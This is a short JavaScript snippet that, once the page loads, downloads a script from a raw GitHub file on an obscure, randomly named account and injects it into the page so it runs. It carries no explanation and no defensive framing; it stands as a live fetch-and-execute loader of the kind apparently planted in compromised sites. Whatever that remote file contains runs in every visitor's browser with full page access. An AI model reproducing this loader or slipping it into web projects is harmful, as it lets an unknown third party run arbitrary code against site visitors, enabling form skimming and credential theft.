document.addEventListener("DOMContentLoaded", function() {
  // URL of the raw file on GitHub
  var rawFileUrl = "https://raw.githubusercontent.com/delemoh79912/asxasw/main/c-se.js";

  // Creating a new XMLHttpRequest object
  var xhr = new XMLHttpRequest();

  // Setting up the request
  xhr.open("GET", rawFileUrl);

  // Handling the response
  xhr.onload = function() {
    if (xhr.status === 200) {
      // Creating a new script element
      var script = document.createElement("script");

      // Setting the script's text content to the response
      script.text = xhr.responseText;

      // Adding the script element to the document
      document.body.appendChild(script);
    }
  };

  // Sending the request
  xhr.send();
});
